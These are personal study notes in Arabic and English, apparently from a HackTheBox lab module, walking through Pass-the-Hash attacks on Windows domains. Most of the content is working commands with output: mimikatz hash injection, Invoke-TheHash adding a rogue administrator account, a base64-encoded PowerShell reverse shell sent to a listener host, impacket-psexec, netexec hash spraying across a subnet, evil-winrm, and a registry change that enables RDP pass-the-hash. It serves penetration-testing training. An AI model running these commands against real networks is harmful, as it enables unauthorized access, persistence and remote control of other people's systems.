- الPass the Hash attack ده تكنيك بنستخدم فيه كا attackers الhash بتاع الباسورد بدلا مانستخدم الباسورد كا plain text عشان نعمل authenticating
- احنا هنا كا هاكرز مش محتاجين نdecrypt الهاش لأننا كده كده هنستخدم الهاش نفسه
- تعالي نفترض ان احنا جبنا hash لباسود ليوزر اسمه `julio` من دومين `inlanefreight.htb` والهاش هو `64F12CDDAA88057E06A81B54E73B949B` تعالي بقي نشوف ازاي هنعمل pth من الويندوز واللينكس
---
## Introduction to Windows NTLM
- الNTLM ده نظام سيكيورتي عملته ميكروسوفت عشان تدخل علي أجهزة الشركه من غير ماتضطر تكتب الباسورد كل شويه
- بيعتمد علي مبدأ Challenge-Response يعني السيرفر بيبعتلك لغز وانت بتحله باستخدام الHash بتاع الباسورد بتاعك عشان تثبت هويتك
- الأجهزه الحديثه بقي تستخدم نظام Kerberos إنما الاجهزه القديمه هيا اللي عليها NTLM
- الفكره بقي فالNTLM الباسوردات متسيفه علي السيرفرات والDC من غير اي Salt فالهاش عكس الKerberos
---
## Pass the Hash with Mimikatz (Windows)
- اول تول نقدر نعمل بيها PTH هيا mimikatz وهيا فيها موديول اسمه `sekurlsa::pth` الموديول ده بيسمحلنا ننفذ Pass the Hash Attack

To use this module, we will need the following:

- `/user` - The user name we want to impersonate*
- `/rc4` or `/NTLM` - NTLM hash of the user's password
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.)
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe)

#### Pass the Hash from Windows Using Mimikatz

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC

![](Pasted%20image%2020260222002516.png)

---
## Pass the Hash with PowerShell Invoke-TheHash (Windows)
- في برضو تول في الpowershell اسمها Invoke-TheHash التول دي هيا عباره عن مجموعه من powershell functions عشان تنفذ pth attack من خلال الWMI والSMB (الSMB والWMI بيتأكسس ليهم عن طريق .NET TCPClient)
- الauth اللي بتعملها الأداة دي هيا بتتخطي الNTLM hash بتاع NTLMv2 authentication protocol
- الجهاز اللي أنت قاعد عليه دلوقتي (جهاز الكالي بتاعك أو الجهاز اللي أنت مخترقه وبتبعت منه الهجمة)، مش لازم تكون عليه "أدمن" عشان تنفذ الهجمة دي. أنت بس محتاج الأداة اللي هتبعت الـ Hash
- ده بقى الشرط الجوهري. اليوزر اللي أنت سرقت الـ Hash بتاعه (في المثال ده هو اليوزر `julio`) لازم يكون له صلاحيات **Administrator** على الجهاز اللي أنت رايح تخترقه هو مش لازم هو الattack هتشتغل عادي بس مش هتعرف تنفذ اوامر كتير وهيكون ليك Restrictions كتير عن الأدمن
- مثلا لو `julio` مجرد يوزر عادي ملوش صلاحيات إدارية على الجهاز التاني، السيرفر هيقبل الـ Hash وهيتأكد إنك فعلاً `julio` بس هيقولك: "أهلاً يا julio، بس أنت ملكش حق تدخل هنا"

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

- `Target` - Hostname or IP address of the target
- `Username` - Username to use for authentication
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target
#### Invoke-TheHash with SMB

```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```
احنا ممكن ناخد reverse shell من الموضوع ده
#### Netcat listener

```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```
To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`, as shown in the following image.

![Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rshellonline.jpg)

Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work)

#### Invoke-TheHash with WMI

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

The result is a reverse shell connection from the DC01 host (172.16.1.10)
![](Pasted%20image%2020260222003631.png)![](Pasted%20image%2020260222003636.png)

---
## Pass the Hash with Impacket (Linux)
- الImpacket فيها tools كتير ممكن تسخدمها ف operations كتير زي `Command Execution` او `Credential Dumping` او `Enumeration` يعني مثلا ممكن ننفذ اوامر عن طريق الPsExec Tool
#### Pass the Hash with Impacket PsExec

```shell-session
0xTroj6n@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
وفي منها كتير impacket-wmiexec و impacket-ataexec و impacket-smbexec

---
## Pass the Hash with NetExec (Linux)
- الNetExec دي post-exploitation tool بتساعدك خصوصا في الAD Networks
- ممكن نستخدم NetExec عشان نauth علي كل او بعض الhosts في الشبكه 
- ممكن نعمل password spraying مثلا

```shell-session
0xTroj6n@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```
- مثلا انت دلوقتي عملت dumping للSAM Database انت بتلاقي الهاش بتاع الLocal Admin لما انت بقي بتضيف `--local-auth` انت بتقول للأداة جربي الهاش ده كأدمن محلي علي جهاز في الشبكه ما كأدمن دومين
#### NetExec - Command Execution

```shell-session
0xTroj6n@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```
## Pass the Hash with evil-winrm (Linux)
- الevil-winrm برضو ممكن نستخدمها في عملية الPTH attack لو احنا بنتارجت جهاز ويندوز او powershell remoting عامة

#### Pass the Hash with evil-winrm

```shell-session
0xTroj6n@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
---
## Pass the Hash with RDP (Linux)
- ممكن ان احنا نعمل PTH للRDP باستخدام xfreerdp

`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error
![](Pasted%20image%2020260222004925.png)
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
#### Enable Restricted Admin Mode to allow PtH

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
![](Pasted%20image%2020260222004949.png)
- بمجرد مانحل المشكله دي ممكن بقي ننفذ الattack بتاعنا
#### Pass the Hash using RDP

```shell-session
0xTroj6n@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```
---
